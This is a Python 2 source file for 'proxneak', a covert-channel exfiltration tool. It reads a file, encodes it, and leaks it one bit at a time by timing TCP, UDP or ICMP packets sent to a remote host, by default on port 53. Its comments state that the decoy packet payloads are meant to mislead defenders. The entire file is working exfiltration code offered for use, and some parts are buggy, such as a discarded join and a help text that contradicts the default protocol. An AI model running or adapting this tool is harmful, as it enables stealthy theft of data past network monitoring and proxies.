# File: proxneak.py
# Copyright (c) 2012 by Jarrod Frates
#
# GNU General Public Licence (GPL)
#
# This program is free software; you can redistribute it and/or modify it under
# the terms of the GNU General Public License as published by the Free Software
# Foundation; either version 2 of the License, or (at your option) any later
# version.
# This program is distributed in the hope that it will be useful, but WITHOUT
# ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
# FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
# details.
# You should have received a copy of the GNU General Public License along with
# this program; if not, write to the Free Software Foundation, Inc., 59 Temple
# Place, Suite 330, Boston, MA  02111-1307  USA
#

import argparse
import base64
import bz2
import random
import socket
import string
import sys
import time

parser = argparse.ArgumentParser(description='Sneak data out through any ' +
    'connection that allows traffic to pass through, even if it\'s a '
    'regenerative proxy. Be aware that random latency can cause problems ' +
    'reconstructing the data at the receiving end; latency effects increase ' +
    'as packet rate is increased.')
parser.add_argument('-s', nargs=1, metavar='<src>',
    help='Source IP address (not currently implemented')
parser.add_argument('-d', nargs=1, metavar='<dst>',
    help='Destination IP address (required)')
parser.add_argument('-p', nargs=1, metavar='port',
    help='Destination port (default is 53)')
parser.add_argument('--proto', nargs=1, metavar='',
    help='Protocol to use (t=TCP, u=UDP (default), i=ICMP); ICMP requires ' +
    'root access')
parser.add_argument('-f', nargs=1, metavar='filename', help='Input file name')
parser.add_argument('-r', nargs=1, metavar='integer',
    help='Number of packets to send per second ' +
    '(default 1; recommended is 5 or less)')
parser.add_argument('-v', action='store_true', help='Verbose mode (be aware ' +
    'that this may leave behind artifacts)')
parser.add_argument('-V', action='version', version='0.3',
    help='Display version number')
parser.add_argument('-z', action='store_true',
    help='Compress content using bzip2 before sending')

args = parser.parse_args()

# Set some default parameters if they're not already set by argument.
# Defaults are port 53, 1 packet/sec, use UDP
if args.d:
    dest = args.d[0]
else:
    print "Destination address (-d) is required."
    sys.exit()
if not args.p:
    dstport = 53
else:
    dstport = int(args.p[0])
if args.f:
    fin = args.f[0]
if not args.r:
    pps = 1
else:
    pps = int(args.r[0])

if not args.proto:
    proto = 'TCP'
else:
    if args.proto[0] == 't':
        proto = 'TCP'
    elif args.proto[0] == 'u':
        proto = 'UDP'
    elif args.proto[0] == 'i':
        proto = 'ICMP'
    else:
        proto = 'UDP'

debug_count = 0

data = ''


# Set default packet data.  This is a random string that is then encoded with
# base64.  The intention is to drive the defenders nuts trying to decode and
# then decrypt what looks like encrypted data, thus further distracting them
# from the true goal of the program.
# TODO: Make this look more realistic for some protocols
# TODO: ICMP to look like Windows, Linux, or Plan9
# TODO: TCP to look like Windows or Linux
def p_data():
    global data
    data_len = random.randrange(16, 120)
    data.join(random.choice(string.ascii_uppercase + string.digits)
        for x in range(data_len))
    data = base64.b64encode(data)
    return data


# binstring takes a single character and converts it to an 8-character string
#   of zeroes and ones
def binstring(c):
    if (len(c) > 1) or (type(c) is not str):
        return None
    str1 = str(bin(ord(c)))[2:]
    if len(str1) < 8:
        str1 = '0' * (8 - len(str1)) + str1
    return str1


# sendchar takes a single character, uses binstring to convert it to "binary",
# and then parses the "binary" string to determine whether to send a packet
# after each timing gap
def sendchar(c, delay):
    global debug_count
    if args.v:
        print '===============> ' + c + ' <==============='
    str1 = binstring(c)
    if str1 is None:
        return
    for l in str1:
        if l == '0':
            if args.v:
                debug_count += 1
            # print str(debug_count) + " No packet to send"
            time.sleep(delay)
        else:
            if args.v:
                debug_count += 1
            buildandsend(delay)


# sendmessage parses the text to send, running each character through sendchar
# to send out the packet sequence representing the binary of the text.
def sendmessage(text, rate):
    if type(text) is not str:
        return "proxneak requires a string to send"
    if rate <= 0:
        return "proxneak requires a positive rate"
    for l in text:
        sendchar(l, 1. / rate)


# Check the protocol and send packets of the appropriate type
# TODO: Make packets look like something real as these will stand out to an
# experienced packeteer
# PONDER: Better to have timer here or in sendchar?
def buildandsend(delay):
    global debug_count
    if args.v:
        print str(debug_count) + " Sending packet"
    if (proto == 'TCP'):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        try:
            s.connect((dest, dstport))
            s.close
        except:
            pass
        time.sleep(delay)
    if (proto == 'UDP'):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
        s.connect((dest, dstport))
        s.send(p_data())
        s.close
        time.sleep(delay)
    if (proto == 'ICMP'):
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, 1)
        s.connect((dest, dstport))
        s.send(data)
        s.close
        time.sleep(delay)
    return


# Retrieve the data to send and put it in base64 format.  This removes the
# possibility of NULL and 0xFF characters (terminating string) being sent.
# TODO: Compress before conversion if required
def main():
    content = open(fin, mode='r')
    if args.z:
        message = base64.b64encode(bz2.compress(content.read()))
    else:
        message = base64.b64encode(content.read())

    # Debug code to compare input and output
    if args.v:
        tMessageFile = open('tempmessage-b64', 'wb')
        tMessageFile.write(message)
        tMessageFile.close

    # Synchronize the connection by sending eight packets
    print "Synchronizing..."
    sendmessage(chr(255), pps)

    # Send the message as one bit per transmission
    print "Sending data..."
    sendmessage(message, pps)

    # Close out the connection with ending sequence of 0x00FF
    print "Finishing up."
    sendmessage(chr(0) + chr(255) + chr(255), pps)


if __name__ == '__main__':
    main()
